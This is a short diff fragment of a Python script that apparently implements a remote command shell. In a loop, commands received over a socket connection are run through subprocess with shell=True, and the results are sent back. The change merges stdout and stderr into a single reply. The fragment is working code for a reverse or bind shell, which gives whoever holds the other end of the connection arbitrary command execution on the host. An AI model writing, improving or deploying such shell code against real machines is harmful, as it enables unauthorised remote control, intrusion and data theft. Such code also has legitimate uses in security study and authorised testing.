@@ -37,7 +37,5 @@ while True:
 	call = subprocess.run(recv_command.decode(), shell=True, capture_output=True)
 	output = call.stdout.decode()
 	error = call.stderr.decode()
-	if len(output) > 0 and len(error) <= 0:
-		conn.sendall(output.encode())
-	elif len(error) > 0 and len(output) <= 0:
-		conn.sendall(error.encode())
+	realoutput = f"{output} {error}"
+	conn.sendall(realoutput.encode())
